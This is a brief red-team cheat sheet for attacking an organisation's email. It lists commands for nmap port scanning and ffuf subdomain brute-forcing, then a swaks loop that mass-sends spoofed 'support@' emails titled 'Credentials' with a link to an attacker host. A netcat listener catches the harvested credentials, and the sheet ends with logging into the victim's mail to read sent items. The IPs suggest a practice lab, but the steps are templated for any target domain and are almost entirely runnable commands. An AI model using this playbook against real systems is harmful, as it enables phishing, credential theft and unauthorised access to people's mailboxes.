# Red Team - Attack on SMTP

1. Information Gathering | `Techniques: Nmap Scanning`
```bash
nmap -sV -sC -v -p- --min-rate=10000 <Target IP>
```

2. Subdomain Enumeration | `Techniques: Using ffuf for subdomain Brute-Forcing`
```bash
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://TargetDomain.com -H "Host: FUZZ.TargetDomain.com"
```

3. Email Collection | `Techniques: Extracting Email from Web Page`
```bash
#Manually visit Target Domain / SubDomain and extract emails to mails.txt 
```

4. Email Engagement | `Techniques: Sending Emails with swaks`
```bash
while read mail; do swaks --to $mail --from support@TargetDomain.com --header "Subject: Credentials" --body "goto http://10.10.14.4" --server 10.10.10.197; done < mails.txt
```

5. Credential Harvesting | `Techniques: Netcat Listener`
```bash
nc -lvp 80 # to listen for incoming connections
```

6. Accessing SMTP | `Techniques: Using evolution to Access SMTP`
```bash
apt install evolution
#and with Configure SMTP server 10.10.10.197 and email user@TargetDomain.com
```

7. Exploring Sent Items | `Techniques: Checking Sent Emails`
```bash
#Check sent items for any useful information afther accessing the SMTP server
```





















































































